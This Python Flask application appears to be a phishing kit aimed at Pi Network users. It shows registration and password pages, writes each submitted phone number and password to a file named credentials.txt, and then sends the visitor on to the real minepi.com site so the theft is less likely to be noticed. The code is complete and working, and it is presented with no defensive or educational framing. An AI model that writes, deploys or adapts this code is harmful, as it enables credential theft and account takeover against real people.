from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# Serve static files (e.g., pp.png)
app.static_folder = 'static'

# Welcome Page
@app.route('/')
def welcome():
    return render_template('welcome.html')

# Registration Page
@app.route('/registration', methods=['GET', 'POST'])
def registration():
    if request.method == 'POST':
        try:
            # Capture phone number from the form
            phone = request.form['phone']
            
            # Log the phone number to credentials.txt
            with open('credentials.txt', 'a') as f:
                f.write(f"Phone: {phone}\n")
            
            # Redirect to the password page
            return redirect(url_for('password'))
        except Exception as e:
            print(f"Error in registration: {e}")
            return redirect(url_for('error'))  # Redirect to error page if something goes wrong
    
    # Render the registration page for GET requests
    return render_template('registration.html')

# Password Page
@app.route('/password', methods=['GET', 'POST'])
def password():
    if request.method == 'POST':
        try:
            # Capture password from the form
            password = request.form['password']
            
            # Log the password to credentials.txt
            with open('credentials.txt', 'a') as f:
                f.write(f"Password: {password}\n")
            
            # Redirect to a legitimate page (e.g., Pi Network's official website)
            return redirect('https://minepi.com')  # Replace with the actual URL
        except Exception as e:
            print(f"Error in password: {e}")
            return redirect(url_for('error'))  # Redirect to error page if something goes wrong
    
    # Render the password page for GET requests
    return render_template('password.html')

# Error Page
@app.route('/error')
def error():
    return render_template('error.html')

# Run the Flask app
if __name__ == '__main__':
    app.run(port=5000, debug=True)  # Enable debug mode for detailed error messages